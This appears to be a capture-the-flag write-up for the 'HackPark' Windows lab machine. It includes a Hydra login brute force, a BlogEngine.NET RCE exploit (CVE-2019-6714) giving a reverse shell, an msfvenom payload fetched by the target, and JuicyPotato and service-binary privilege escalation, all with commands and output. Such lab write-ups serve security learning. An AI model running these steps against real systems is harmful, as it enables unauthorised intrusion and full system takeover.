## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.67.132
# HOSTNAME  //Found Post Initial Enumeration
Host Name:                 HACKPARK                                                           
# OPERATING SYSTEM  //Found Post Initial Enumeration
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600 
# CREDENTIALS    //Found Post Initial Enumeration
admin:1qaz2wsx
administrator:4q6XvFES7Fdxs
```
## OPEN PORTS DETAILS
```bash
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 8.5
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
```
# ENUMERATION
## PORT 80
```bash
- Found BlogEngine 3.3.6.0 from page source
- Found login page on url http://10.10.67.132/Account/login.aspx?ReturnURL=/admin/

# Brute force using Hydra - using default username admin
sudo hydra -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt $ip http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=ijRtTzfxL7YAf0jW5RnyrrTGYeffio3GGdihEsUvhIKJPj0%2BNo3qwBg9EE61B%2BOUeTdvyW88M1wDuxxvy1TQdYc3vOOekfqnNECdE7qSY0t0%2Bkusu98UbqzowKRzRVsx28C2h25V5Kwqnv2OJPQsh%2FmCVo4rVAuI7SnpTBBkfWWzThWTQ3wLvGx44WMMbL0KO8So6CLf2NELMGZR1rQTiZPls3ine5E%2BSWP340OFQisaVN5oloRs9W6fcIr3bb7zbpFO1LiXqNzBniizisCiGxlRSryzKDZ%2Fgz1bQyDm1B5Q%2FB%2BOxJ0HW4mJT18YrsrZNZXTEpwHjbQ6nfCvbTmLEez1Tb6lQ%2F65B01Ot0xHYUMuRJtz&__EVENTVALIDATION=%2Fee2haixYLWd4NltxWvfDTFChPiFTaHI84cGcVJFuHAgylkHWGaQEsufr1uK0G0HPdNlSLMw09IN%2F%2BwPKEdshp99EdkHQ5zLa80B%2FMQMVEYgO2rpTLZF9QHuh%2FhY%2FSUugGV1t2n8jHVRmL0F4AeFDSYMhZ4V3SnCAZrL%2FapMujR1j%2FMZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-26 09:39:46
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-form://10.10.67.132:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=ijRtTzfxL7YAf0jW5RnyrrTGYeffio3GGdihEsUvhIKJPj0%2BNo3qwBg9EE61B%2BOUeTdvyW88M1wDuxxvy1TQdYc3vOOekfqnNECdE7qSY0t0%2Bkusu98UbqzowKRzRVsx28C2h25V5Kwqnv2OJPQsh%2FmCVo4rVAuI7SnpTBBkfWWzThWTQ3wLvGx44WMMbL0KO8So6CLf2NELMGZR1rQTiZPls3ine5E%2BSWP340OFQisaVN5oloRs9W6fcIr3bb7zbpFO1LiXqNzBniizisCiGxlRSryzKDZ%2Fgz1bQyDm1B5Q%2FB%2BOxJ0HW4mJT18YrsrZNZXTEpwHjbQ6nfCvbTmLEez1Tb6lQ%2F65B01Ot0xHYUMuRJtz&__EVENTVALIDATION=%2Fee2haixYLWd4NltxWvfDTFChPiFTaHI84cGcVJFuHAgylkHWGaQEsufr1uK0G0HPdNlSLMw09IN%2F%2BwPKEdshp99EdkHQ5zLa80B%2FMQMVEYgO2rpTLZF9QHuh%2FhY%2FSUugGV1t2n8jHVRmL0F4AeFDSYMhZ4V3SnCAZrL%2FapMujR1j%2FMZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[80][http-post-form] host: 10.10.67.132   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-26 09:39:51

# Credentail
admin:1qaz2wsx
```
## INITIAL FOOTHOLD
```bash
# RCE Exploit 
- BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution 
- CVE:2019-6714

- Exploit Source 
https://raw.githubusercontent.com/irbishop/CVEs/refs/heads/master/2019-10720/exploit.py

- Setup Listener
sudo rlwrap nc -nvlp 80

- Run the exploit 
python3 exploit.py -t $ip -u admin -p 1qaz2wsx -l 10.13.80.25:80

sudo rlwrap nc -nvlp 80  
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.67.132] 49276
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
c:\windows\system32\inetsrv>
c:\windows\system32\inetsrv>
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog

# Proper Shell
- Payload
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.13.80.25 LPORT=80 -f exe -o shell.exe
- Transfer
sudo python3 -m http.server 80                                                                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.67.132 - - [26/Feb/2025 10:00:25] "GET /shell.exe HTTP/1.1" 200 -
10.10.67.132 - - [26/Feb/2025 10:00:26] "GET /shell.exe HTTP/1.1" 200 -
- Listener
sudo rlwrap nc -nvlp 80
- Reverse Shell
C:\Windows\Tasks>.\shell.exe &
```
## PRIVILEGE ESCALATION
## METHOD I
```bash
whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

# Potato exploit - Reference - https://jlajara.gitlab.io/Potatoes_Windows_Privesc

- Using JuicyPotato.exe
- Source https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
- Start Listener

C:\Windows\Tasks>JuicyPotato.exe -l 1337 -p c:\Windows\Tasks\shell.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} &
Testing {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} 1337
....
[+] authresult 0
{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83};HACKPARK\Administrator
[+] CreateProcessWithTokenW OK

sudo rlwrap nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.67.132] 49373
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hackpark\administrator
```
## METHOD II
```bash 
- Run winpeas.exe
- Find Vulnerable service 
WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper      

- Folder "C:\Program Files (x86)\SystemScheduler" with write permisson 

- Check tasklist /v 
- Seems like Message.exe is running from "C:\Program Files (x86)\SystemScheduler"
- Backup and Replace Message.exe with our shell.exe renamed
- Start Listener

# administrator
```
## METHOD III
```bash
- Run winpeas.exe
- Found Administrator Credentials
???????????? Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  4q6XvFES7Fdxs    


administrator:4q6XvFES7Fdxs
# RDP
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Wed Feb 26 08:48:24 2025 as: /usr/lib/nmap/nmap -Pn -p- -sC -sV -vv -oN nmap/scan-script-version 10.10.67.132
adjust_timeouts2: packet supposedly had rtt of -995651 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -995651 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -990482 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -990482 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -988669 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -988669 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -982926 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -982926 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -985766 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -985766 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -982916 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -982916 microseconds.  Ignoring time.
Nmap scan report for 10.10.67.132
Host is up, received user-set (0.36s latency).
Scanned at 2025-02-26 08:48:27 IST for 495s
Not shown: 65533 filtered tcp ports (no-response)

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx

3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-02-26T03:26:36+00:00
|_ssl-date: 2025-02-26T03:26:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=hackpark
| Issuer: commonName=hackpark
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-02-25T03:17:09
| Not valid after:  2025-08-27T03:17:09
| MD5:   7de8:c401:410d:2b2b:1fc3:85d5:f43b:484e
| SHA-1: cdc3:b16b:2f26:92f8:5566:9764:940f:f6e6:2963:41cd
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQczRISbNxxqZKR9Kks9YRAjANBgkqhkiG9w0BAQUFADAT
| MREwDwYDVQQDEwhoYWNrcGFyazAeFw0yNTAyMjUwMzE3MDlaFw0yNTA4MjcwMzE3
| MDlaMBMxETAPBgNVBAMTCGhhY2twYXJrMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAzknOTyDzHTI5V8huijefFYpvqQdJMo49Y8qkzi0cK523SSpEjYbx
| OnIrnzKfKrDzxucGpItzCq2ajgzARiuhUaS5vv14yqcx5PsdswqYH1vMix21lnZe
| 8f6m8mZL7eLg6iyRJT+SEBWZ0YPENAStVBBtsC2WI9V20Cs1jmK9/l/B3gWJGk2Q
| eD4QmbXW7ERX6IqmL96gkiiAtjCpgaeQQ/rWBv8EbQAj1CbloCCLVYMRBV5CTF+v
| lDPCrOo9nkIMj8pCmtEfOuxKRmtzCD8FWryzwfGgbri5w604ryyhiYFq36par6DZ
| RbYvldBpqZi7291BasjZ6mZZGbB5DJgnPwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAK9Kb2B1dF1f
| T/XWuuYBQ6uEvZiAmlQC2t0e/F2YrgZouCqyJJnzZ3iOWA0nCGY/yfyO2WRc5g1z
| nOMQ0W5URi2Iem9L3shc3c3diEbxXxv+62V5R4sD7SEXjyIeGxgqstdYhJtvpWvs
| p1Vg5KseNB6QtfMrUyTPXaY+/KRgFCRrsuHh7K8sBnOf+AfqCcHTdVE17rD5VMNX
| mdHt69ptgLc5/CDzvP3eqAl1WUEi7ohwvFQPCfl2IZU4mtFOyRE/Kq/pELHm5ODI
| jmQl7Kigm9NNfRQDFyfu3hSuXxQxsh9EQEAZwaBdltATdQLa6fhGzjHdUhf465BX
| yvq8nFbefto=
|_-----END CERTIFICATE-----

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 26 08:56:42 2025 -- 1 IP address (1 host up) scanned in 498.14 seconds
```

